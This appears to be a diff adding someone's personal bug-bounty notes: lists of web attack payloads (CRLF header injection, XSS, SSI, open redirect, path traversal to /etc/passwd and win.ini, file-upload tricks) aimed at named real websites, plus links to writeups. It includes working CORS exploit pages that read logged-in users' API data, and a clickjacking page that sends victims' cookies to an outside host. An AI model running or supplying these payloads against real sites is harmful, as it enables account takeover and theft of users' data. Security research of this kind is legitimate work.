@@ -1,0 +1,209 @@
+Bob rov
+
+html injection 
+
+1:<a href="//bf.am">Welcome</a>  in name field
+
+
+crlf injection
+
+1:https://touch.lady.mail.ru/%0aSet-Cookie:csrftoken=x;domain=.mail.ru;
+
+2:http://www.vimeopro.com/crlftest%0dSet-Cookie:test=test;domain=.vimeopro.com
+
+3:http://ishop.qiwi.com/test%0dSet-Cookie:test2=test;domain=.qiwi.com
+
+4: GET /%0d%0aLocation:%20http://www.evilzone.org
+
+
+SSI injection
+
+1:GET //#"--><!--#include file="robots.txt"-->
+
+
+xss
+
+1:https://blackfan.ru/x?r=https://realty.mail.ru/%22--%3e%3csvg/onload=alert(document.domain)%3e/%252e%252e
+
+2:https://apps.wordpress.com/support/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+3:http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e   (chrome)
+
+4:http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e  
+
+(firefox)
+
+5:
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
+
+6: javascript%0a:alert(1);//
+
+7:<svg/on<script>load=prompt(document.domain);>”/>
+
+<svg/on<script>load=prompt(document.cookie);>
+
+
+Open Redirect
+
+1: https://dashboard.signwithenvoy.com//www.google.com/%2e%2e%2f
+
+2: https://admin.c2fo.com///www.google.com/%2e%2e
+
+3: http://zaption.com///www.google.com/%2f%2e%2e
+
+4:http://greenhouse.io/%0d%0aSet-Cookie:test=test;domain=.greenhouse.io
+
+
+
+
+-----------------------------------------------------------------------------------------------
+
+Path traversal
+
+1:IIS8.5 --- "../../../../../../../../../../windows/win.ini"
+---"../../../../../../../../../../inetpub/wwwroot/web.config"
+
+
+----/%5c  for finding an empty page
+
+http://help.vulntome.com /@app/skin/views/%5c../etc/passwd.html
+
+http://help.vulntome.com/@app/skin/views/%5c../%5c../etc/passwd.html
+
+http://help.vulntome.com/@app/skin/views/%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd.html
+
+
+file upload 
+
+1: trick --changed the file extension from .mp4 to .html and the insert some malacious html code like
+
+<script>alert(1)</script>
+
+2: trick --change content type from "image/jpeg" to "text/html"
+
+------------------
+
+bug bounty links and tricks
+
+1:https://medium.com/@logicbomb_1/bugbounty-api-keys-leakage-source-code-disclosure-in-indias-largest-e-commerce-health-care-c75967392c7e  
+
+
+2:https://github.com/Fuzzapi/fuzzapi  ---for restapi
+
+3: some more bug bounty platforms
+
+https://www.synack.com/
+https://www.zerocopter.com/en/signup
+
+4:for androids
+
+https://medium.com/bugbountyhunting/bug-bounty-hunting-tips-2-target-their-mobile-apps-android-edition-f88a9f383fcc
+
+5: for amazon bucket list
+
+https://medium.com/bugbountyhunting/bug-bounty-hunting-tips-3-kicking-s3-buckets-84c231939066
+
+6: loookk for --https://teamultimate.in/   & waf bypass for xss test (http://wafdemo.cf/)
+
+http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html---for xss
+
+https://bugbaba.blogspot.in/2018/02/exploiting-cors-miss-configuration.html
+
+cors xploit via xss
+
+<p id=demo></p></script><script>
+function cors() {  
+var xhttp = new XMLHttpRequest();  
+xhttp.onreadystatechange = function() {    
+    if (this.readyState == 4 && this.status == 200) {    
+    alert(this.responseText);     
+    document.getElementById("demo").innerHTML = this.responseText;    
+    }  
+};  
+xhttp.open("GET", "https://sub.site.com/api/v2/config", true);  
+xhttp.withCredentials = true;  
+xhttp.send();
+}
+cors();
+</script>
+
+7. self xss with clickjacking
+
+Here is the Click jacking which is chained with self xss which grabs victim’s cookies.
+
+<html>
+<head><title>Poc</title></head>
+<body bgcolor=”gray”>
+<h1 align=”center”>DRAG N DROP GAME</h1>
+<br><br><br>
+<img src=”https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSi0I3s6J4VZohcVZbzUzJ-g-y722W8jqyo4g1lc0HhM9SH9WN9" draggable=true id=drag 
+
+ondragstart=”event.dataTransfer.setData(‘text/plain’,’<script>location=`http://armaanpathan.pe.hu/cookies.php?cookie=`+btoa(document.cookie)</script>')">
+
+<br><br><br>
+<style type=”text/css”>
+iframe {
+width: 800px;
+height: 650px;
+position: absolute;
+top: 2; right: 10;
+filter: alpha(opacity=50);
+opacity: 0.00 ;
+
+</style>
+<style type=”text/css”>
+ h2{
+position: absolute;
+top: 420; right: 30;
+}
+</style>
+<iframe src=”www.victim.com"></iframe>
+<H2>DRAG THE IMAGE HERE</h2>
+</html>
+
+8.https://medium.com/@armaanpathan/dont-just-alert-1-because-xss-is-for-fun-f88cfb88d5b9 (xss to keystroke)
+
+https://medium.com/bugbountywriteup/how-i-was-able-to-bypass-strong-xss-protection-in-well-known-website-imgur-com-8a247c527975  --good xss bypass must read
+
+http://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/ (good blogs do read it)
+
+https://medium.com/@armaanpathan/stealing-user-details-by-exploiting-cors-c5ee86ebe7fb
+cors code
+
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById(“demo”).innerHTML = alert(this.responseText);
+}
+};
+xhttp.open(“GET”, “https://www.victim.com/api/user?version=show_with_logins", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}</script></head>
+<body onload=”cors()”>
+<center>
+<h2>CORS POC Exploit armaan </h2>
+<h3>Extract SID</h3><div id=”demo”>
+<button type=”button” onclick=”cors()”>Exploit</button></div></body></html>
+
+9: pastejacking  & intruder payloads
+
+https://github.com/dxa4481/Pastejacking
+
+https://github.com/1N3/IntruderPayloads
+
+10:https://medium.com/@thebuckhacker/how-i-could-make-more-then-1-700-subdomains-takeovers-on-amazon-s3-in-few-minutes-8f6b27bffe0d
+--http://codegrazer.com/blog/7-reflected-xss.html ---for xss
+
+11:web crawler--https://github.com/tijme/not-your-average-web-crawler#testing
+
+CSS Injection--https://github.com/dxa4481/cssInjection
+
+12:https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb --- ssrf 
